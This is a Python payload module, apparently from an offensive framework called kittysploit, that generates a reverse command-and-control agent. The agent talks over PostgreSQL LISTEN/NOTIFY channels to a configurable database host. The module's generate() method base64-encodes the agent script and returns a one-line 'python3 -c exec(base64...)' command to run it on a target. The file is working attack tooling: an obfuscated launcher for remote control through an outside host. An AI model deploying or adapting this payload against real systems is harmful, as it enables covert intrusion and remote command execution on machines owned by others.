#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

from kittysploit import *
from lib.c2.postgresql_notify_agent import build_postgresql_notify_agent_script


class Module(Payload):
    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Python PostgreSQL NOTIFY Reverse Agent",
        "description": (
            "C2 agent over PostgreSQL LISTEN/NOTIFY. Pairs with "
            "listeners/database/postgresql_notify_shell. Requires psycopg2 on target "
            "and network access to PostgreSQL."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.MULTI,
        "listener": "listeners/database/postgresql_notify_shell",
        "handler": Handler.REVERSE,
        "session_type": SessionType.POLLING,
    }

    db_host = OptString("127.0.0.1", "PostgreSQL host", True)
    db_port = OptPort(5432, "PostgreSQL port", True)
    username = OptString("postgres", "PostgreSQL username", True)
    password = OptString("", "PostgreSQL password", False)
    database = OptString("postgres", "Database name", True)
    client_id = OptString("agent1", "Agent client ID (must match listener)", False)
    command_channel = OptString("ks_cmd", "NOTIFY channel for commands", False, advanced=True)
    result_channel = OptString("ks_result", "NOTIFY channel for results", False, advanced=True)
    python_binary = OptString("python3", "Python on target", False)

    def generate(self):
        script = build_postgresql_notify_agent_script(
            str(self.db_host),
            int(self.db_port or 5432),
            str(self.username or "postgres"),
            str(self.password or ""),
            str(self.database or "postgres"),
            str(self.client_id or "agent1"),
            str(self.command_channel or "ks_cmd"),
            str(self.result_channel or "ks_result"),
        )
        enc = base64.b64encode(script.encode()).decode("ascii")
        py = str(self.python_binary or "python3")
        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
